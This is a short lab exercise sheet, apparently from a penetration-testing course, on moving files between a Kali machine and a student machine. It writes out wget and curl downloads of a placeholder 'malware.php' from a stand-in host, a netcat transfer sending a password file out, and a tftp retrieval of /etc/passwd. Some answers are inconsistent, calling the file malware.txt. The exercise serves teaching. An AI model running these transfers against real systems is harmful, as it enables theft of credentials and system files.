### 6. Downloading Files

#### Exercices
1. On your Kali machine, create a file named malware.php.
    ````
    echo "This is a malware file" > malware.php
    ````
    Then, in the same directory, ccreate a temporary server with python on port 5000.
    ````
    python3 -m http.server 5000
    ````
1. On your Student machine, download the malware.txt file with the wget command.
    > Your command : wget X.X.X.X:5000/malware.php

1. On your Student machine, download the malware.txt file with the cURL command.
    > Your command : curl X.X.X.X:5000/malware.php --output malware.php

1. On the student machine, create a file named password.txt and transfer it to your kali machine with netcat
    > Your commands : touch password.txt  
    > receiving part : nc -l -p 4444 > password.txt  
    > sending part : nc -w 5 [destination] 4444 < password.txt  

1. On the student machine,  transfer ``/etc/passwd`` file to your kali machine with tftp
    > Your commands :  tftp X.X.X.X
                       get /etc/passwd
                       

                        
